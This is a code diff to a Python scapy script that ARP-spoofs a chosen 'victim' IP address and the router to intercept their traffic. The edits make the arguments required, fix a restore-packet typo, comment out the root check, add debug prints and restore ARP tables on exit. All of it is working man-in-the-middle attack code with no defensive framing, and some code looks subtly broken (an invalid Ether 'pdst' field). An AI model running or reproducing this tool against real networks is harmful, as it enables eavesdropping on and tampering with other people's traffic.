@@ -11,9 +11,27 @@ def takeArguments():
     parser = ArgumentParser(description="Add the description of this tool here")
 
     # List of arguments
-    parser.add_argument("-v", "--victim", type=str, help="set the IP address of the victim/target.")
-    parser.add_argument("-r", "--router", type=str, help="set the IP address of the router/gateway.")
-    parser.add_argument("-i", "--interface", type=str, help="set the interface to start ARP spoofing.")
+    parser.add_argument(
+        "-v",
+        "--victim",
+        type=str,
+        help="set the IP address of the victim/target.",
+        required = True
+    )
+    parser.add_argument(
+        "-r",
+        "--router",
+        type=str,
+        help="set the IP address of the router/gateway.",
+        required = True
+    )
+    parser.add_argument(
+        "-i",
+        "--interface",
+        type=str,
+        help="set the interface to start ARP spoofing.",
+        required = True
+    )
 
     # Parse and return the arguments
     return parser.parse_args()
@@ -26,13 +44,15 @@ def get_mac(ip):
     brodcast = Ether(pdst="ff:ff:ff:ff:ff:ff") / ARP(pdst = ip)
     
     try:
-        reply = srp(brodcast, timeout = 2, verbose = False)[0]
-        mac = reply[0][1].hwsrc
-        return mac
+        reply = srp(brodcast, timeout = 1, verbose = False)[0]
     
     except Exception as e:
         print(f"Error: {e}")
-        exit("[!] Unable to find the MAC address of the victim")
+        exit(f"[!] Unable to find the MAC address of the {ip}")
+
+    else:
+        mac = reply[0][1].hwsrc
+        return mac
 
 def spoof(target_ip, spoof_ip, interface):
     """
@@ -61,27 +81,31 @@ def restore(original_ip, spoofed_ip, interface):
 
     packet = ARP(
         op = 2, 
-        psdt = original_ip,
+        pdst = original_ip,
         hwdst = get_mac(original_ip),
         psrc = spoofed_ip,
         hwsrc = get_mac(spoofed_ip)
     )
 
     try: 
-        send(packet, iface=interface, count=3, verbose = False)
+        send(packet, iface=interface, verbose = False)
     
     except Exception as e:
         print(f"Error: {e}")
         exit("[!] Unable to send the restore packet!")
 
 def main(args):
-    if(getuid() != 0):
-        exit("[!] Run this script as root!!!\n[!] Exiting...")
+    # if(getuid() != 0):
+    #     exit("[!] Run this script as a root!!!\n[!] Exiting...")
 
     sentPackets = 0
 
     try:
-        print("Sending fake ARP request to the target and router...")
+        print("Sending fake ARP packets to the target and router...")
+
+        print(type(args.victim), args.victim)
+        print(type(args.router), args.router)
+        print(type(args.interface), args.interface)
 
         while True:
             spoof(args.victim, args.router, args.interface)
@@ -92,10 +116,14 @@ def main(args):
     except KeyboardInterrupt:
         print("[!] Keyboard Interupt:")
         print(f"Total spoofed packet sent: {sentPackets}")
-        exit("Exiting...")
 
     except Exception as e:
         print(f"Error: {e}")
         exit("[!] Unable to send the packet!")
-    
+
+    finally:
+        restore(args.victim, args.router, args.interface)
+        restore(args.router, args.victim, args.interface)
+        exit("Exiting...")
+
 main(takeArguments())
